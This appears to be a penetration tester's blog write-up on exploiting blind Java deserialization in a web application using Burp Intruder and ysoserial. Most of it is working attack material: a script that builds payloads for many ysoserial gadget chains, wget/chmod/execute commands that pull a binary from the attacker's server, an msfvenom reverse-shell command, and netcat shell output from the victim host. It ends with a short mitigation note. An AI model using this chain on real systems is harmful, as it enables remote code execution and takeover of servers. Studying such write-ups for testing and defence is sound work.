

##
#
https://www.coalfire.com/the-coalfire-blog/exploiting-blind-java-deserialization
#
##

Exploiting Blind Java Deserialization with Burp and Ysoserial
While performing a web application  penetration test, I stumbled upon a parameter with some base64 encoded data within a POST parameter. Curious as to what it was, I sent it over to Burp decoder.

While performing a web application penetration test, I stumbled upon a parameter with some base64 encoded data within a POST parameter. Curious as to what it was, I sent it over to Burp decoder.


click to enlarge image

After two rounds of URL decoding and one round of Base64 decoding, I had what appeared to be a serialized Java payload. This was apparent from the magic number, which is rO0 in ASCII or AC ED 00 in hex. Having heard of ysoserial, I figured that the best course of action would be to build a payload with that toolset and send it as the value of the POST parameter I had identified. Ysoserial is great because it contains a wide array of payloads, but I didn’t really have any way of knowing which one to use. Lucky for me, a blog post I found on /r/netsec detailed a scenario that was extremely similar to mine. The post by Petre Popescu contained a script that would create a series of payloads containing any command for each different payload type that allows for command execution. Much like him, I did not know the underlying operating system either, so I created ping payloads for both Linux and Windows. Another problem I found when analyzing the baseline payload is that it was not simply base64 encoded; it was base64 encoded, split with line breaks every 76 characters, and then URL encoded twice. I modified Petre’s script to accommodate for this.
```
import os
import re
import base64
import urllib
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
            'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1',
            'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
            'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']
def generate(name, cmd):
    for payload in payloads:
        final = cmd.replace('REPLACE', payload)
        print 'Generating ' + payload + ' for ' + name + '...'
        command = os.popen('java -jar ../ysoserial.jar ' + payload + ' "' + final + '"')
        result = command.read()
        command.close()
        encoded = base64.b64encode(result)
        if encoded != "":
            #Create line breaks at 76 characters
            encoded = re.sub("(.{76})", "\\1\n", encoded, 0, re.DOTALL)
            #Double URL encode the payload
            encoded = urllib.quote_plus(urllib.quote_plus(encoded))
            open(name + payload + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 [MY_SERVER])
generate('Linux', 'ping -c 1 [MY_SERVER])

```

Like Petre, I used Burp Intruder to send these payloads one by one, swapping out the payload into the vulnerable parameter. I started tcpdump on my server filtering for ICMP.

root@MyServer:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes

As the payloads began to fire off, I noticed one ping came into my server with a DNS name that matched my client. To validate which payload worked, I ran the Intruder attack again, slowing it down to see which payload actually fired. I found that the target was Linux and that the CommonsBeanutils1 payload had worked.

I really wanted a reverse shell, so my next focus was on getting a payload that would work on my target. I then tried to execute all the one-liners from the pentestmonkey Reverse Shell Cheat Sheet, with no luck. I then got the idea to wget down a payload from a server I control, set the execute bit, and then execute it. I initially tried to chain these three commands:

    wget http://MY_SERVER:8080/payload -o /tmp/payload
    chmod +x /tmp/payload
    /tmp/payload

After some trial and error, I later found that chaining commands with a semicolon didn’t really work in this context and that I needed to send them one at a time. Having failed before with the one-liner payloads, I created an ELF binary for Linux to connect back to my server with msfvenom.

root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp LPORT=443 LHOST=MY_SERVER -f elf > payload
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes

Not knowing the architecture, I just chose a 32-bit payload as I knew it would work on both 64-bit and 32-bit. After sending the three serialized java commands, I received a connection back on my server.
```
root@MyServer:~# nc -lvp 443
listening on [any] 443 ...
connect to [XXX.XXX.XXX.XXX] from victim.com [XXX.XXX.XXX.XXX] 60173
python -c 'import pty;pty.spawn("/bin/bash")'
[user@victim]$ id
id
uid=500(victim) gid=500(victim) groups=500(victim)
```
After receiving a reverse shell on the target, I quickly informed the client.

The best way to mitigate this class of vulnerability is to use alternative data formats, avoiding native deserialization formats. If an application requires passing serialized objects, it must only do so with signed and validated serialized objects to reduce the risk on an arbitrary object supplied by a malicious user. 
